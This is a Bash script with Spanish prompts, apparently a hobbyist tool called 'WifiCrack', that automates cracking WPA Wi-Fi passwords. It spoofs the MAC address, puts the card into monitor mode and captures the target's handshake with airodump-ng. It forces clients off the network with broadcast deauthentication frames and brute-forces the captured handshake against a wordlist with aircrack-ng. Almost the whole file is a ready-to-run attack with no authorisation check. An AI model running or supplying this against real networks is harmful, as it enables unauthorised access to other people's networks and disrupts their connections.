#!/bin/bash

# Modulo de colores 
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
cleancolor="echo -e "${endColour}""

if [ $(id -u) -ne 0 ]; then
	echo -e "$redColour\n[!] Debes ser root para ejecutar la herramienta -> (sudo $0)"
exit 1
fi

test -f /usr/bin/aircrack-ng
airtest=$(echo $?)

test -f /usr/bin/xterm
xtermtest=$(echo $?)

test -f /usr/bin/macchanger
macctest=$(echo $?)

if [ $airtest -eq 0 ]; then
	clear
	# Banner
	echo -e "${turquoiseColour}"
	echo " ( ( ( /\ ) ) )  "
	echo "      /\/\      "  
	echo "     /\/\/\       " 
	echo "    /)/\/\(\   "
	echo "   /\/\/\/\/\ "
	echo "  / O O O O  \ "
	echo "WifiCrack ByKidd3n"
	echo "/\/\/\/\/\/\/\/\ "
	echo -e "${purpleColour}"
	echo "[+] Github: https://github.com/kidd3n"
	read -p "[+] Enter para continuar"
		$cleancolor
		iwconfig | awk '$1~/^[a-z]+[0-9]+/{print $1}'
			echo -e "${blueColour}"
			read -p "[?] Que tarjeta deseas usar: " tar
			$cleancolor
			echo -e "\n[*] Se esta iniciando el modo monitor y cambiando tu dirrecion MAC en $tar\n"
			airmon-ng start $tar > /dev/null 2>&1
			ifconfig ${tar}mon down && macchanger -a ${tar}mon > /dev/null 2>&1
			ifconfig ${tar}mon up
			airmon-ng check kill > /dev/null 2>&1
			echo -e "\n${yellowColour}[*] Nueva dirección MAC asignada: $(macchanger -s ${tar}mon | grep -i current | xargs | cut -d ' ' -f '3-100')"
			echo -e "\n${greenColour}[*] Ya tienes tu tarjeta preparada!"
			read -p "Quieres hacer un ataque? [Y/N]: " rps
				$cleancolor
				if [ "$rps" == "Y" ] || [ "$rps" == "y" ]; then
					xterm -hold -e "airodump-ng ${tar}mon" &
					airodump_xterm_PID=$!
					read -p "Que red deseas atacar?: " ap
					read -p "En que canal esta ${ap}?: " channel

					kill -9 $airodump_xterm_PID
					wait $airodump_xterm_PID 2>/dev/null

					xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap ${tar}mon" &
					airodump_filter_xterm_PID=$?

					sleep 5; xterm -hold -e "aireplay-ng -0 12 -e $ap -c FF:FF:FF:FF:FF:FF ${tar}mon" &
					aireplay_xterm_PID=$!
					sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

					sleep 10; kill -9 $airodump_filter_xterm_PID
					wait $airodump_filter_xterm_PID 2>/dev/null

					read -p "Ruta del diccionario al usar: " dicc
					xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap" &
					
					echo -e "$blueColour"
					echo -e "\nSe ha terminado el ataque a la red\n"
					$cleancolor
					sudo airmon-ng stop ${tar}mon > /dev/null 2>&1
					sudo service NetworkManager start > /dev/null 2>&1
					sudo service wpa_suppclicant start > /dev/null 2>&1
					break
				fi
			if [ "$rps" == "N" ] || [ "$rps" == "n" ]; then
				echo -e "${redColour}\n[*] Saliendo"
				$cleancolor
				break
			fi
else
	tool_name="aircrack-ng"
	tool_name2="macchanger"
	tool_name3="xterm"

	if ! command -v $tool_name > /dev/null 2>&1; then
	echo -e "\n[*] Instalando aircrack-ng, luego ejecute de nuevo la herramienta"
	sudo apt-get install $tool_name -y > /dev/null 2>&1 || {  
		echo "[*] Instalando Dependencias"
		sudo pacman -S $tool_name || {
		echo -e "\n$redColour[!] No se pudo instalar $tool_name" >&2
		exit 1
		}
	}
	fi

	if ! command -v $tool_name2 > /dev/null 2>&1; then
	echo -e "\n[*] Instalando macchanger, luego ejecute de nuevo la herramienta"
	sudo apt-get install $tool_name2 -y > /dev/null 2>&1 || {  
		echo "[*] Instalando Dependencias"
		sudo pacman -S $tool_name2 || {
		echo -e "\n$redColour[!] No se pudo instalar $tool_name2" >&2
		exit 1
		}
	}
	fi

	if ! command -v $tool_name3 > /dev/null 2>&1; then
	echo -e "\n[*] Instalando xterm, luego ejecute de nuevo la herramienta"
	sudo apt-get install $tool_name3 -y > /dev/null 2>&1 || {  
		echo "[*] Instalando Dependencias"
		sudo pacman -S $tool_name3 || {
		echo -e "\n$redColour[!] No se pudo instalar $tool_name3" >&2
		exit 1
		}
	}
	fi
fi